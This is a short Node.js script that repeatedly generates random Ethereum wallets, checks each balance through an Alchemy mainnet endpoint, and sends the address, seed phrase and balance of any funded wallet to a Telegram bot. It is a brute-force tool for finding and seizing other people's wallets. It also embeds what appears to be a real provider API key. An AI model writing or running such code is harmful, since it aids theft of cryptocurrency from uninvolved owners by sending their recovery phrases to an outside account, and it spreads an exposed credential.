const ethers = require('ethers');
const axios = require('axios');

const API_KEY = 'https://eth-mainnet.g.alchemy.com/v2/9PEsxhsX-9G-uZ0m8KEN_FAPR4FwK-6s'; // Web3 provider API URL
const TELEGRAM_BOT_TOKEN = 'your telegram api ';
const TELEGRAM_CHAT_ID = 'your telegram ID';

const provider = new ethers.JsonRpcProvider(API_KEY);

async function sendToTelegram(message) {
    const telegramApiEndpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(telegramApiEndpoint, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    });
}

async function main() {
    while (1) {
        let wallet = ethers.Wallet.createRandom();
        let mnemonic = wallet.mnemonic.phrase;
        let address = wallet.address;
        let balance = ethers.formatEther(await provider.getBalance(wallet.address));

        console.log(balance);

        if (balance !== '0.0') {
            // Send to Telegram
            const message = `Found Ether in wallet!\nAddress: ${address}\nMnemonic: ${mnemonic}\nBalance: ${balance}`;
            await sendToTelegram(message);
        }
    }
}

main();
